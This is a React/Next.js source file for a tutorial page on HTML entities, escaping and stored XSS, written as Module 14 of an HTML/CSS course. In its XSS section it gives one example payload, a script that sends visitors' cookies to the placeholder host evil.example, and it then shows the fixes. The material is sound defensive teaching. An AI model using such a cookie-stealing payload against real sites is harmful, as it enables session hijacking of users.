import type { Metadata } from 'next'
import { LearnLayout } from '@/components/content/LearnLayout'
import Link from 'next/link'
import { Callout } from '@/components/content/Callout'
import { KeyTakeaways } from '@/components/content/KeyTakeaways'

export const metadata: Metadata = {
  title: 'HTML Entities & Special Characters | Chaduvuko',
  description:
    'Why some characters need to be escaped, the entities you will actually use, and the bugs that happen when you forget.',
}

const C = '#7b61ff'

const SectionTag = ({ text }: { text: string }) => (
  <div style={{
    fontSize: 10, fontWeight: 700, letterSpacing: '.14em',
    textTransform: 'uppercase', color: 'var(--muted)',
    fontFamily: 'var(--font-mono)', marginBottom: 10,
  }}>{text}</div>
)

const SectionTitle = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{
    fontSize: 'clamp(20px, 2.5vw, 28px)', fontWeight: 900,
    letterSpacing: '-1px', color: 'var(--text)', marginBottom: 18,
    fontFamily: 'var(--font-display)', lineHeight: 1.2,
  }}>{children}</h2>
)

const SubTitle = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{
    fontSize: 'clamp(16px, 1.8vw, 20px)', fontWeight: 700,
    letterSpacing: '-0.3px', color: 'var(--text)', marginBottom: 12,
    fontFamily: 'var(--font-display)',
  }}>{children}</h3>
)

const SubSubTitle = ({ children }: { children: React.ReactNode }) => (
  <h4 style={{
    fontSize: 15, fontWeight: 700, color: 'var(--text)', marginBottom: 10,
  }}>{children}</h4>
)

const Para = ({ children }: { children: React.ReactNode }) => (
  <p style={{
    fontSize: 15, color: 'var(--text)', lineHeight: 1.9, marginBottom: 20,
  }}>{children}</p>
)

const CodeBox = ({ children, label }: { children: string; label?: string }) => (
  <div style={{ marginBottom: 24 }}>
    {label && (
      <div style={{
        fontSize: 11, fontWeight: 700, color: 'var(--muted)',
        letterSpacing: '.1em', textTransform: 'uppercase',
        marginBottom: 6, fontFamily: 'var(--font-mono)',
      }}>{label}</div>
    )}
    <pre style={{
      background: 'var(--bg2)', border: '1px solid var(--border)',
      borderRadius: 10, padding: '18px 22px', overflowX: 'auto',
      fontSize: 13, lineHeight: 1.9, color: 'var(--text)',
      fontFamily: 'var(--font-mono)', margin: 0, whiteSpace: 'pre-wrap',
    }}>
      <code>{children}</code>
    </pre>
  </div>
)

const Divider = () => (
  <div style={{ borderTop: '1px solid var(--border)', margin: '52px 0' }} />
)

export default function HtmlEntitiesSpecialCharacters() {
  return (
    <LearnLayout
      title="HTML Entities & Special Characters"
      description="Why some characters need to be escaped, the entities you will actually use, and the bugs that happen when you forget."
      section="HTML & CSS — Module 14"
      readTime="20 min"
      updatedAt="August 2026"
    >

      {/* ── Part 01 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 01 — The Problem" />
        <SectionTitle>Why Some Characters Cannot Just Appear in Text Content</SectionTitle>

        <Para>
          HTML has a small set of characters that carry special meaning to the parser itself — they are
          not ordinary text, they are syntax. The moment the parser encounters one of these characters
          inside what you intended as plain text content, it stops treating that text as text and starts
          trying to interpret it as markup instead. This module is about exactly which characters those
          are, the safe replacement syntax (called an <strong>entity</strong>) for writing them literally,
          and — just as importantly — when you genuinely do <em>not</em> need an entity at all.
        </Para>

        <CodeBox label="The character that breaks everything: a literal < in text">{`<p>Use the < operator to compare two numbers.</p>`}</CodeBox>

        <Para>
          To a human reader, that sentence is obviously plain English. To the HTML parser, the moment it
          hits <code>&lt;</code> it assumes a new tag is starting — because that is, structurally,
          exactly what <code>&lt;</code> means everywhere else in an HTML document. What actually renders
          is either broken text, a silently swallowed fragment of your sentence, or — in the worst case —
          a real security vulnerability, covered fully in Part 04.
        </Para>

        <SubTitle>The three characters that are genuinely dangerous to leave unescaped</SubTitle>

        <Para>
          Of the handful of characters HTML treats specially, three matter enough that you should
          basically never write them raw inside text content: <code>&lt;</code>, <code>&gt;</code>, and{' '}
          <code>&amp;</code>. Each has a distinct reason.
        </Para>

        <CodeBox label="Why each of the three matters">{`<   starts a tag. "5 < 10" inside text content risks being parsed as the beginning of "<10"
>   closes a tag. Less dangerous alone, but should be escaped for consistency and safety
&   starts an entity reference. "Smith & Sons" risks being parsed as the start of "&Sons" — an
    incomplete/invalid entity, which browsers handle inconsistently`}</CodeBox>

        <Callout type="warning">
          <strong>Browsers are forgiving about malformed markup, and that forgiveness hides bugs.</strong>{' '}
          A raw <code>&amp;</code> not followed by anything that looks like an entity name will often
          render fine in every major browser today — but "often works by accident" is a different thing
          from "correct," and relying on parser leniency is exactly the kind of thing that breaks
          unpredictably across browser versions, XML-based tooling, or RSS/Atom feed parsers that are far
          stricter than a browser&apos;s HTML parser.
        </Callout>
      </section>

      <Divider />

      {/* ── Part 02 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 02 — Named Entities" />
        <SectionTitle>The Named Entities You Will Actually Use</SectionTitle>

        <Para>
          An HTML entity is a small piece of reserved syntax — starting with <code>&amp;</code> and
          ending with <code>;</code> — that the parser replaces with a specific character when rendering,
          rather than interpreting the surrounding text as markup. Named entities use a human-readable
          name between those two symbols.
        </Para>

        <CodeBox label="The syntax pattern">{`&name;`}</CodeBox>

        <CodeBox label="The essential named entities — escaping the parser-significant characters">{`&amp;    →  &     (ampersand)
&lt;     →  <     (less than)
&gt;     →  >     (greater than)
&quot;   →  "      (double quote)
&apos;   →  '      (apostrophe / single quote)`}</CodeBox>

        <Para>
          These five cover the actual syntax-significant characters. <code>&amp;quot;</code> and{' '}
          <code>&amp;apos;</code> matter specifically inside attribute values — if an attribute is quoted
          with double quotes, a literal double quote inside that value would prematurely end the
          attribute, exactly the same class of problem as an unescaped <code>&lt;</code> in text content.
        </Para>

        <CodeBox label="Why quote entities matter inside attributes">{`<!-- Broken — the attribute value ends at the first unescaped double quote -->
<img alt="A 6" tall sculpture" src="sculpture.jpg">

<!-- Correct -->
<img alt="A 6&quot; tall sculpture" src="sculpture.jpg">

<!-- Also correct, and often cleaner — just switch the outer quote style -->
<img alt='A 6" tall sculpture' src="sculpture.jpg">`}</CodeBox>

        <SubTitle>Common typographic and symbol entities</SubTitle>

        <Para>
          Beyond the five syntax-critical entities, a set of named entities exist purely as convenient,
          readable shorthand for characters that are perfectly valid to type directly as raw Unicode
          (covered fully in Part 03) but that are historically easy to mistype or hard to enter on some
          keyboards.
        </Para>

        <CodeBox label="Common typographic entities">{`&nbsp;    →  (non-breaking space)
&copy;    →  ©
&reg;     →  ®
&trade;   →  ™
&mdash;   →  —     (em dash)
&ndash;   →  –     (en dash)
&hellip;  →  …     (ellipsis)
&laquo;   →  «
&raquo;   →  »
&euro;    →  €
&pound;   →  £
&cent;    →  ¢`}</CodeBox>

        <Para>
          <code>&amp;nbsp;</code> deserves a special mention — it is not just a convenient way to type a
          space, it is a <em>functionally different character</em>. A normal space is a place the browser
          is allowed to break a line of text for wrapping; a non-breaking space forbids a line break at
          that exact point. This is the entity you reach for to keep something like{' '}
          <code>{`10<span> </span>MB`}</code> visually glued together, or to stop a browser from wrapping
          "Mr." away from the name that follows it.
        </Para>

        <CodeBox label="A concrete use for &nbsp; — preventing an awkward line-wrap">{`<!-- Without &nbsp;, "10" and "MB" could end up split across two lines -->
<p>Maximum file size: 10&nbsp;MB</p>

<!-- Same idea for a number that shouldn't wrap away from its unit -->
<p>Ships in 3&nbsp;–&nbsp;5 business days.</p>`}</CodeBox>
      </section>

      <Divider />

      {/* ── Part 03 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 03 — Numeric Character References" />
        <SectionTitle>Numeric Character References — The Fallback That Always Works</SectionTitle>

        <Para>
          Named entities are convenient, but HTML does not have a named entity for every possible
          character — there is no <code>&amp;heartbeat;</code> or a named entity for most emoji.{' '}
          <strong>Numeric character references</strong> solve this by referencing any Unicode character
          directly by its numeric code point, in either decimal or hexadecimal form.
        </Para>

        <CodeBox label="The two numeric forms">{`&#169;     decimal — code point 169 → ©
&#xA9;     hexadecimal (note the x) — same code point, hex form → ©`}</CodeBox>

        <Para>
          Every named entity has an equivalent numeric form, and every numeric form works everywhere a
          named entity does — the reverse is not true, since not every character has a name. This makes
          numeric references the genuinely universal fallback: if you know a character&apos;s Unicode
          code point, <code>&amp;#code;</code> or <code>&amp;#xhex;</code> will render it correctly
          regardless of whether a named entity exists for it.
        </Para>

        <CodeBox label="Characters with no convenient named entity">{`&#x2764;   ❤   (heavy black heart — no named entity)
&#x1F600;  😀  (grinning face emoji — no named entity)
&#8593;    ↑   (upwards arrow)`}</CodeBox>

        <Callout type="info">
          You will rarely type numeric references from memory in real work — they exist mainly as an
          escape hatch for characters without a name, or as what your editor/CMS auto-generates when you
          paste in special characters. Knowing they exist, and recognizing <code>&amp;#169;</code> as "the
          numeric form of an entity, not a typo," is the practically useful part.
        </Callout>
      </section>

      <Divider />

      {/* ── Part 04 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 04 — What Actually Breaks" />
        <SectionTitle>What Breaks, Concretely, When You Forget to Escape</SectionTitle>

        <Para>
          It is worth seeing the actual failure modes rather than taking "you must escape these
          characters" on faith. Three distinct things go wrong, at three different levels of severity.
        </Para>

        <SubSubTitle>1. Visually broken or missing text</SubSubTitle>

        <CodeBox label="A price comparison that silently disappears">{`<p>Now $50, was <$80.</p>

<!-- The browser sees "<$80" and, seeing "<" is not followed by a valid tag name character
     pattern it recognizes, typically falls back to treating it as literal text in modern
     browsers -- but this behavior is NOT guaranteed and varies by exact context and parser,
     which is precisely the problem: it "usually" works, until it doesn't. -->`}</CodeBox>

        <CodeBox label="A genuinely broken case — a real angle-bracket pattern that IS valid tag syntax">{`<p>Compare using the <select> operator from the dropdown.</p>

<!-- The parser sees "<select>" and creates an ACTUAL <select> form control element
     right there in the paragraph -- not text saying the word "select" in angle brackets.
     The sentence's meaning is destroyed, and a stray empty dropdown appears on the page. -->`}</CodeBox>

        <CodeBox label="Fixed — escaped, and unambiguously rendered as text">{`<p>Compare using the &lt;select&gt; operator from the dropdown.</p>`}</CodeBox>

        <SubSubTitle>2. Broken attribute values</SubSubTitle>

        <Para>
          Covered in Part 02 — an unescaped quote character matching the attribute&apos;s own quote style
          terminates the attribute early, and everything after it is parsed as if it were a new,
          unintended attribute or raw markup.
        </Para>

        <SubSubTitle>3. Cross-Site Scripting (XSS) — the security-critical case</SubSubTitle>

        <Para>
          This is the failure mode that matters most in real production code, and it is why this topic is
          not merely a formatting nitpick. If your page ever inserts user-supplied text into the DOM
          without escaping it, a user can submit text containing actual HTML — including a{' '}
          <code>&lt;script&gt;</code> tag — and have it execute as real code in every other visitor&apos;s
          browser.
        </Para>

        <CodeBox label="An unescaped comment field — a genuine security hole">{`<!-- If "userComment" comes straight from a database with no escaping applied,
     and a user submitted this as their comment text: -->
<script>document.location = "https://evil.example/steal?cookie=" + document.cookie</script>

<!-- ...then rendering it directly into the page runs that script for every visitor
     who views the comment. This is a textbook stored XSS vulnerability. -->
<div class="comment">\${userComment}</div>`}</CodeBox>

        <Callout type="warning">
          <strong>This is why every serious templating system and frontend framework escapes text content
          by default.</strong> React escapes any string you render inside JSX automatically — you have to
          go out of your way, using <code>dangerouslySetInnerHTML</code>, to opt back into raw
          unescaped HTML, and that name is deliberately alarming for a reason. Server-rendered templating
          languages (Jinja2, ERB, Django templates) work the same way: text is escaped unless you
          explicitly mark it as safe. Manually escaping every character yourself is rarely how this is
          handled in real production code — but understanding exactly what the framework is protecting
          you from is what makes you trust that default, rather than fighting it.
        </Callout>
      </section>

      <Divider />

      {/* ── Part 05 ── */}
      <section style={{ marginBottom: 64 }}>
        <SectionTag text="// Part 05 — When Raw Unicode Is Fine" />
        <SectionTitle>When You Can Just Type the Character Directly</SectionTitle>

        <Para>
          Given everything above, it is a common overcorrection to assume every non-ASCII or special
          character needs an entity. That is not true, and it produces markup that is harder to read and
          harder to search for no real benefit. The dividing line is simple: entities exist to handle
          characters that are <strong>syntactically significant to the parser</strong>, or that are hard
          to type/see (like <code>&amp;nbsp;</code>). Ordinary Unicode text — accented letters, curly
          quotes, em dashes, most punctuation, emoji — is completely safe to type directly, provided your
          document correctly declares <code>&lt;meta charset="UTF-8"&gt;</code>, which you met in the
          Metadata & SEO module.
        </Para>

        <CodeBox label="Perfectly fine to type directly, no entity needed">{`<p>Café Résumé — naïve piñata. 😀 “Curly quotes” work fine too.</p>

<!-- Equivalent using entities — technically valid, but needlessly harder to read and edit -->
<p>Caf&eacute; R&eacute;sum&eacute; &mdash; na&iuml;ve pi&ntilde;ata. &#x1F600;
&ldquo;Curly quotes&rdquo; work fine too.</p>`}</CodeBox>

        <Para>
          The first version is genuinely the better real-world choice — readable in source, easy to
          search-and-replace, and trivially editable by a non-technical content editor. The second version
          is not "more correct" — it is simply less legible for no functional gain, given a properly
          declared UTF-8 charset.
        </Para>

        <SubTitle>The one caveat: characters that are ALSO syntactically significant</SubTitle>

        <Para>
          The rule flips for the small set of characters covered in Parts 01–02: <code>&lt;</code>,{' '}
          <code>&gt;</code>, <code>&amp;</code>, and quote characters inside attribute values. These are
          not a Unicode-encoding problem — UTF-8 handles them fine — they are a{' '}
          <em>parsing</em> problem, because the character itself collides with HTML&apos;s own syntax.
          UTF-8 support does not change that <code>&lt;</code> still means "a tag is starting" to the
          parser. Those specific characters need entities (or numeric references) regardless of how
          correctly your document declares its encoding.
        </Para>

        <Callout type="tip">
          <strong>A simple rule that covers nearly every real situation:</strong> escape{' '}
          <code>&lt;</code>, <code>&gt;</code>, and <code>&amp;</code> in text content, and escape
          whichever quote character matches your attribute&apos;s quote style inside attribute values.
          Everything else — accented letters, symbols, emoji, typographic punctuation — is safe to type
          directly as long as the document declares UTF-8.
        </Callout>
      </section>

      <Divider />

      {/* ── Part 06 — Real World ── */}
      <section style={{ marginBottom: 64 }} data-toc-kind="story">
        <SectionTag text="// Part 06 — Real World" />
        <div style={{
          fontSize: 10, fontWeight: 700, letterSpacing: '.12em',
          textTransform: 'uppercase', color: 'var(--muted)', marginBottom: 12,
          fontFamily: 'var(--font-mono)',
        }}>
          💼 What This Looks Like at Work
        </div>
        <SectionTitle>A Product Review Feature at a Portland Outdoor Gear Retailer</SectionTitle>

        <div style={{
          background: 'var(--surface)', border: '1px solid var(--border)',
          borderRadius: 12, padding: '24px 28px', marginBottom: 24,
        }}>
          <div style={{
            fontSize: 11, fontWeight: 700, color: 'var(--accent)',
            background: 'rgba(0,230,118,0.1)', border: '1px solid rgba(0,230,118,0.2)',
            borderRadius: 6, padding: '4px 10px', fontFamily: 'var(--font-mono)',
            display: 'inline-block', marginBottom: 20, letterSpacing: '.1em',
            textTransform: 'uppercase',
          }}>
            Scenario — Outdoor gear e-commerce, Portland · Customer reviews section
          </div>

          <Para>
            A Portland-based outdoor gear retailer ships a customer reviews feature for product pages. An
            engineer builds the server-rendered template quickly, pulling review text straight out of the
            database and inserting it into the page.
          </Para>

          <CodeBox label="The original template logic (pseudocode, matching the real bug pattern)">{`<div class="review-text">
  \${review.rawBodyText}
</div>`}</CodeBox>

          <SubSubTitle>The first sign something is wrong</SubSubTitle>

          <Para>
            QA files a bug: a review that mentions "the straps are &lt;2 inches wide, which chafes" is
            rendering with the entire rest of the sentence missing from that point on. The <code>&lt;</code>{' '}
            in "&lt;2 inches" is being parsed as the start of a tag, and everything after it is silently
            swallowed or misrendered depending on the browser. This alone is treated as a straightforward
            escaping bug and scheduled as low-priority polish.
          </Para>

          <SubSubTitle>What the security review actually finds</SubSubTitle>

          <Para>
            During a routine security review ahead of a compliance audit, an engineer flags the same
            underlying issue as something far more serious: because review text is inserted directly
            without escaping, nothing stops a submitted review from containing a real{' '}
            <code>&lt;script&gt;</code> tag. A proof-of-concept review containing a script tag that
            silently POSTs the visiting user&apos;s session cookie to an external URL is submitted in a
            staging environment — and it runs, for every visitor who views that product page.
          </Para>

          <CodeBox label="The fix — escape on the way in, or escape on render, never insert raw">{`<!-- Server-side templating engines like Jinja2 and Django templates auto-escape by default.
     The actual bug here was a raw/unescaped output filter being used explicitly: -->

<!-- BROKEN — explicitly opted OUT of the template engine's default escaping -->
<div class="review-text">{{ review.body | safe }}</div>

<!-- FIXED — let the template engine's default auto-escaping do its job -->
<div class="review-text">{{ review.body }}</div>`}</CodeBox>

          <Para>
            The fix itself is almost trivially small — removing a filter that had explicitly disabled the
            template engine&apos;s default escaping, likely added months earlier to "fix" the exact
            visual truncation bug QA had originally filed, without understanding why the truncation was
            happening in the first place. The real lesson the team takes away: a visual escaping bug and a
            security vulnerability are very often the exact same root cause wearing two different
            severities, and "make the visual glitch go away" is never an acceptable fix on its own without
            understanding why raw markup was reaching the page.
          </Para>
        </div>
      </section>

      <Divider />

      {/* ── Part 07 — Misconceptions ── */}
      <section style={{ marginBottom: 64 }} data-toc-kind="myth">
        <SectionTag text="// Part 07 — Misconceptions" />
        <SectionTitle>Four Misconceptions About Entities and Escaping</SectionTitle>

        {[
          {
            wrong: '"Every non-ASCII character — accented letters, emoji, curly quotes — needs an HTML entity"',
            right: 'No — as long as the document declares UTF-8 (via meta charset), ordinary Unicode text is completely safe to type directly. Entities exist for characters that are syntactically significant to the HTML parser (<, >, &, and quotes in attributes), not as a general Unicode-safety mechanism.',
          },
          {
            wrong: '"&nbsp; is just a shorthand way to type a regular space"',
            right: 'It is a functionally different character. A regular space is a valid line-break point for text wrapping; a non-breaking space forbids the browser from wrapping a line at that position. It is used specifically to keep short pieces of text — like a number and its unit — glued together visually.',
          },
          {
            wrong: '"Escaping user input is a nice-to-have that prevents ugly rendering glitches"',
            right: 'It is a security requirement, not a cosmetic one. Failing to escape user-supplied text before inserting it into the DOM is the direct mechanism behind stored XSS (Cross-Site Scripting) attacks — a genuinely serious, actively exploited vulnerability class, not a rendering nitpick.',
          },
          {
            wrong: '"Numeric character references like &#169; are a legacy, rarely-used feature"',
            right: 'They are the universal fallback that works for any Unicode code point, including thousands of characters and emoji that have no named entity at all. Named entities only exist for a limited, historically defined set of characters — numeric references cover everything else.',
          },
        ].map((item, i) => (
          <div key={i} style={{
            background: 'var(--surface)', border: '1px solid var(--border)',
            borderRadius: 10, padding: '20px 24px', marginBottom: 16,
          }}>
            <div style={{
              fontSize: 13, fontWeight: 700, color: 'var(--red)',
              marginBottom: 8, fontFamily: 'var(--font-mono)',
            }}>
              ✕ &quot;{item.wrong}&quot;
            </div>
            <div style={{ fontSize: 14, color: 'var(--muted)', lineHeight: 1.7 }}>
              {item.right}
            </div>
          </div>
        ))}
      </section>

      <Divider />

      {/* ── Part 08 — Interview Prep ── */}
      <section style={{ marginBottom: 64 }} data-toc-kind="prep">
        <SectionTag text="// Part 08 — Interview Prep" />
        <SectionTitle>5 Interview Questions — With Complete Answers</SectionTitle>

        {[
          {
            q: 'Which characters absolutely must be escaped in HTML text content, and why those specifically?',
            a: '<, >, and & — because these are the characters HTML\'s own syntax is built from. < signals the start of a tag, > signals the end of one, and & signals the start of an entity reference. Any other character is just data to the parser; these three are structurally overloaded to also mean something in markup, which is why leaving them raw risks the parser misinterpreting plain text as structure.',
          },
          {
            q: 'What is the difference between a named entity and a numeric character reference?',
            a: 'A named entity (like &amp;copy;) uses a human-readable name for a specific, pre-defined set of characters. A numeric character reference (&#169; in decimal, or &#xA9; in hex) references any Unicode code point directly by number, and works for every character, including the many that have no named entity at all — emoji and less common symbols, for example.',
          },
          {
            q: 'Why is failing to escape user-generated content before rendering it a security issue, not just a display bug?',
            a: 'If raw user input is inserted directly into the DOM, a malicious user can submit text containing an actual <script> tag (or other executable markup, like an event handler attribute) that runs as real JavaScript in every other visitor\'s browser when they view that content — a stored Cross-Site Scripting (XSS) vulnerability. This can be used to steal session cookies, perform actions as the victim, or redirect them to a malicious site.',
          },
          {
            q: 'Do you need to write &eacute; instead of just typing é directly into an HTML file?',
            a: 'No, provided the document correctly declares <meta charset="UTF-8">. Accented letters and most other Unicode characters are ordinary text data to the HTML parser, not syntax, so they can be typed directly. Entities are for characters that collide with HTML\'s own syntax, or for characters that are impractical to type/see directly, like &nbsp;.',
          },
          {
            q: 'How does React (or a templating engine like Django templates) handle this problem by default, and why does that matter?',
            a: 'Both escape any dynamic string content automatically before rendering it — React does this for anything rendered as a JSX expression; Django/Jinja2 templates auto-escape variables unless explicitly marked safe. This means a developer does not need to manually call an escaping function on every piece of dynamic text; the framework\'s default behavior is the safe one, and opting out (dangerouslySetInnerHTML in React, the "safe" filter in Django templates) requires a deliberate, clearly-named action, which is a deliberate design choice to make the risky path visible in code review.',
          },
        ].map((item, i) => (
          <div key={i} style={{
            background: 'var(--surface)', border: '1px solid var(--border)',
            borderRadius: 12, padding: '24px 28px', marginBottom: 20,
          }}>
            <div style={{
              fontSize: 14, fontWeight: 800, color: 'var(--text)',
              marginBottom: 14, lineHeight: 1.4,
            }}>
              {item.q}
            </div>
            <div style={{ fontSize: 14, color: 'var(--muted)', lineHeight: 1.85 }}>
              {item.a}
            </div>
          </div>
        ))}
      </section>

      <Divider />

      {/* ── Common Mistakes ── */}
      <section style={{ marginBottom: 64 }} data-toc-kind="plain">
        <SectionTag text="// Common Mistakes" />
        <SectionTitle>Escaping Mistakes Beginners Make Constantly</SectionTitle>

        <SubSubTitle>Mistake: writing a raw ampersand in a company name or "A & B" phrase</SubSubTitle>
        <CodeBox label="Risky — a real entity name can start right after the &">{`<p>Smith & Sons Hardware</p>`}</CodeBox>
        <CodeBox label="Fixed">{`<p>Smith &amp; Sons Hardware</p>`}</CodeBox>

        <SubSubTitle>Mistake: a literal quote character inside a same-quoted attribute value</SubSubTitle>
        <CodeBox label="Broken — the attribute ends at the first embedded double quote">{`<a title="Click "here" to continue">Continue</a>`}</CodeBox>
        <CodeBox label="Fixed — escape the embedded quote, or switch quote styles">{`<a title="Click &quot;here&quot; to continue">Continue</a>
<a title='Click "here" to continue'>Continue</a>`}</CodeBox>

        <SubSubTitle>Mistake: showing a "less than" comparison in plain text</SubSubTitle>
        <CodeBox label="Broken — the parser can misread this as the start of a tag">{`<p>Only accept values < 100.</p>`}</CodeBox>
        <CodeBox label="Fixed">{`<p>Only accept values &lt; 100.</p>`}</CodeBox>

        <SubSubTitle>Mistake: over-escaping ordinary Unicode text that needed no escaping at all</SubSubTitle>
        <CodeBox label="Unnecessary — harder to read and edit, with a properly declared UTF-8 charset">{`<p>Caf&eacute; &mdash; 5 st&#xE9;les</p>`}</CodeBox>
        <CodeBox label="Preferred — plain UTF-8 text, given a correct charset declaration">{`<p>Café — 5 stéles</p>`}</CodeBox>

        <SubSubTitle>Mistake: inserting user-generated content into the page without escaping it</SubSubTitle>
        <CodeBox label="Broken — a real XSS vulnerability if the source is untrusted, framework-dependent example">{`<div class="comment">{{ userComment | safe }}</div>`}</CodeBox>
        <CodeBox label="Fixed — rely on the framework's default auto-escaping">{`<div class="comment">{{ userComment }}</div>`}</CodeBox>
      </section>

      <Divider />

      {/* ── Error Library ── */}
      <section style={{ marginBottom: 64 }} data-toc-kind="plain">
        <SectionTag text="// Error Library" />
        <SectionTitle>Bugs This Topic Produces — And Exactly Why</SectionTitle>

        {[
          {
            error: `Part of a sentence silently disappears from the rendered page`,
            cause: 'A raw < character in text content happened to be followed by characters the parser recognized (or misjudged) as a valid tag name, so it started treating the rest of the line as markup instead of text.',
            fix: 'Escape every literal < as &lt; and every literal > as &gt; in text content, especially in any sentence discussing code, math comparisons, or generic type syntax.',
          },
          {
            error: `A stray, empty form control (like a dropdown or input) appears where it shouldn't`,
            cause: 'Text mentioning a real HTML tag name in angle brackets — e.g. "the <select> element" — was inserted unescaped, and the browser created an actual <select> element right there in the content instead of rendering the words literally.',
            fix: 'Escape the angle brackets: &lt;select&gt;. This is especially common in technical/documentation content that discusses HTML tags by name.',
          },
          {
            error: `An attribute value gets cut off, and unrelated attributes or broken markup appear after it`,
            cause: 'A literal quote character inside an attribute value matches the attribute\'s own quote style, prematurely closing the attribute. Everything after it is parsed as new (unintended) attributes on the same tag.',
            fix: 'Escape the embedded quote as &quot; (inside double-quoted attributes) or &apos; (inside single-quoted attributes), or simply switch the attribute\'s outer quote style to avoid the collision.',
          },
          {
            error: `A security scanner or code review flags a stored XSS vulnerability in a user-content field`,
            cause: 'User-submitted text is being inserted into the DOM without escaping, meaning a submitted <script> tag or an HTML attribute with an inline event handler (like onerror=) would execute as real code for anyone viewing that content.',
            fix: 'Never disable your framework or templating engine\'s default auto-escaping for content sourced from users. If raw HTML genuinely must be rendered (e.g. a trusted rich-text editor\'s output), sanitize it through a dedicated library (like DOMPurify) — never insert it raw.',
          },
          {
            error: `An RSS feed or XML-based tool fails to parse a page/feed that a browser renders fine`,
            cause: 'Browsers are unusually lenient about malformed markup, silently recovering from stray, unescaped &, <, or > characters in ways that stricter XML parsers will not. A feed reader or XML validator will often reject the exact same document a browser quietly "fixed" on the fly.',
            fix: 'Escape special characters correctly rather than relying on browser leniency — this matters even more in XML-adjacent contexts (RSS/Atom feeds, sitemaps, SVG) than in ordinary HTML, since those formats are parsed strictly.',
          },
        ].map((item, i) => (
          <div key={i} style={{
            background: 'var(--bg2)', border: '1px solid var(--border)',
            borderRadius: 10, padding: '20px 24px', marginBottom: 16,
          }}>
            <div style={{
              fontFamily: 'var(--font-mono)', fontSize: 12,
              color: 'var(--red)', marginBottom: 12,
              background: 'rgba(255,71,87,0.08)', border: '1px solid rgba(255,71,87,0.2)',
              borderRadius: 6, padding: '8px 12px',
              lineHeight: 1.5,
            }}>
              {item.error}
            </div>
            <div style={{ marginBottom: 8 }}>
              <span style={{
                fontSize: 10, fontWeight: 700, color: 'var(--muted)',
                fontFamily: 'var(--font-mono)', letterSpacing: '.1em',
                textTransform: 'uppercase',
              }}>Cause: </span>
              <span style={{ fontSize: 13, color: 'var(--muted)', lineHeight: 1.7 }}>{item.cause}</span>
            </div>
            <div>
              <span style={{
                fontSize: 10, fontWeight: 700, color: 'var(--accent)',
                fontFamily: 'var(--font-mono)', letterSpacing: '.1em',
                textTransform: 'uppercase',
              }}>Fix: </span>
              <span style={{ fontSize: 13, color: 'var(--muted)', lineHeight: 1.7 }}>{item.fix}</span>
            </div>
          </div>
        ))}
      </section>

      {/* ── Key Takeaways ── */}
      <KeyTakeaways items={[
        '<, >, and & are syntactically significant to the HTML parser and should always be escaped in text content — as &lt;, &gt;, and &amp; respectively.',
        'Quote characters inside attribute values need escaping (&quot; or &apos;) whenever they match the attribute\'s own quote style, or the attribute value ends early.',
        'Named entities (&copy;, &nbsp;, &mdash;, etc.) are convenient shorthand; numeric character references (&#169; or &#xA9;) are the universal fallback that works for any Unicode code point, including characters with no named entity.',
        '&nbsp; is not just a convenient space — it is a functionally different, non-breaking character used to prevent an unwanted line-wrap between two pieces of text.',
        'Ordinary Unicode text (accented letters, curly quotes, emoji, most punctuation) is safe to type directly given a correctly declared UTF-8 charset — entities are not a general requirement for non-ASCII characters.',
        'Failing to escape user-generated content before rendering it is a genuine security vulnerability (stored XSS), not merely a cosmetic bug — this is why React, Django templates, and most modern frameworks escape dynamic content by default.',
        'Browsers are unusually lenient about unescaped special characters, which hides bugs that stricter parsers (XML, RSS/Atom feed readers) will not tolerate.',
      ]} />

      {/* ── Next Module CTA ── */}
      <div style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderRadius: 10, padding: '24px', marginTop: 40 }}>
        <p style={{ fontSize: 10, color: 'var(--muted)', letterSpacing: '.12em', textTransform: 'uppercase', fontFamily: 'var(--font-mono)', fontWeight: 700, margin: '0 0 10px' }}>
          What comes next
        </p>
        <p style={{ fontSize: 15, color: 'var(--text)', lineHeight: 1.85, margin: '0 0 20px' }}>
          Module 15 covers HTML best practices and validation — the W3C Markup Validator, void elements,
          attribute quoting conventions, and the specific mistakes the validator catches that a browser
          silently forgives.
        </p>
        <Link href="/learn/html-css/html-best-practices-validation" style={{ background: C, color: '#fff', padding: '11px 24px', borderRadius: 7, fontWeight: 700, fontSize: 13, textDecoration: 'none', display: 'inline-block' }}>
          Module 15 → HTML Best Practices & Validation
        </Link>
      </div>
    </LearnLayout>
  )
}
